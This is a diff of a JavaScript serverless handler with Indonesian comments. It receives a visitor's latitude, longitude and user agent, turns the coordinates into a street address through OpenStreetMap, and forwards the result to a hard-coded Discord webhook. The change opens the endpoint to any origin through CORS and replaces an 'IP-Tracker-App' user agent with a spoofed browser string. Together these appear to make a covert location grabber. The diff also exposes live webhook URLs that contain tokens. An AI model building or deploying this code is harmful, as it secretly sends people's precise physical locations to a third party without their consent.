@@ -1,30 +1,32 @@
 export default async function handler(req, res) {
+    // Izinkan akses dari mana saja (CORS)
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+
     if (req.method === 'POST') {
         try {
-            // 1. Tangani body agar aman dibaca (parse jika masih berupa string/buffer)
-            let bodyData = req.body;
-            if (typeof bodyData === 'string') {
-                bodyData = JSON.parse(bodyData);
-            }
-            
-            const { lat, lon } = bodyData || {};
+            // Ambil data lat dan lon dari request body secara aman
+            const { lat, lon } = req.body || {};
             const userAgent = req.headers['user-agent'] || 'Unknown';
 
             if (!lat || !lon) {
-                return res.status(400).json({ error: 'Koordinat tidak ditemukan' });
+                return res.status(400).json({ error: 'Koordinat tidak lengkap' });
             }
 
-            // 2. Ambil nama alamat menggunakan Nominatim dengan menyertakan User-Agent khusus
+            // Ambil alamat dari OpenStreetMap
             const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, {
-                headers: {
-                    'User-Agent': 'IP-Tracker-App/1.0 (contact@example.com)'
-                }
+                headers: { 'User-Agent': 'Mozilla/5.0' }
             });
             const geoData = await geoRes.json();
             const address = geoData.display_name || 'Tidak diketahui';
 
-            // 3. Webhook Discord Anda
-            const discordWebhookUrl = "https://discord.com/api/webhooks/1563198219284906116/bTgAtzBPWpJ3T8laDTu-SUC0pppBkUV7ceFDUHedGpo74toylxKkkwFCKPk6czvT8HXA";
+            // Webhook Discord Anda
+            const discordWebhookUrl = "https://discord.com/api/webhooks/1563200957985202330/D_-tm21Rstj0Z3jXL7YAFjyIvSqBfdT9DT0uesV9-90YZ0ZCx8Psg6x_qVf0WbV0ls4R";
 
             if (discordWebhookUrl) {
                 const message = {
@@ -43,11 +45,10 @@ export default async function handler(req, res) {
 
             return res.status(200).json({ success: true });
         } catch (error) {
-            console.error("Gagal memproses lokasi:", error);
+            console.error("Error:", error);
             return res.status(500).json({ error: error.message });
         }
     }
-    
-    res.setHeader('Allow', ['POST']);
-    res.status(405).json({ error: `Method ${req.method} Not Allowed` });
+
+    return res.status(405).json({ error: 'Method not allowed' });
 }
